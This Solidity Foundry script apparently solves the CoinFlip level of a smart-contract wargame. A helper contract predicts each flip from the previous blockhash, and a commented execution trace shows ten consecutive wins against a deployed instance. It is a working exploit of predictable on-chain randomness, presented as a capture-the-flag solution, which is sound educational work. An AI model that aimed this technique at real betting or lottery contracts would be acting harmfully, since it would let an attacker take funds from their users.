// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }


} 

contract CoinFlipSolution is Script {

    CoinFlip public coinflipInstance = CoinFlip(0x4E368a8a46c44487BAD324B0c681C5283fb7A25e);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("consecutiveWins:",coinflipInstance.consecutiveWins()); 
        vm.stopBroadcast();
    }
}

/*forge script script/CoinFlipSolution.s.sol \
--rpc-url $RPC_URL \
--private-key $PRIVATE_KEY \
--broadcast -vvvv \
--tc CoinFlipSolution
[⠊] Compiling...
No files changed, compilation skipped
Traces:
  [72718] CoinFlipSolution::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [29267] → new Player@0xb3CFf8447F1FB4c0aE4cd6282B40b67BfB2DEcd2
    │   ├─ [12787] 0x4E368a8a46c44487BAD324B0c681C5283fb7A25e::flip(false)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 62 bytes of code
    ├─ [295] 0x4E368a8a46c44487BAD324B0c681C5283fb7A25e::consecutiveWins() [staticcall]
    │   └─ ← [Return] 10
    ├─ [0] console::log("consecutiveWins:", 10) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  consecutiveWins: 10*/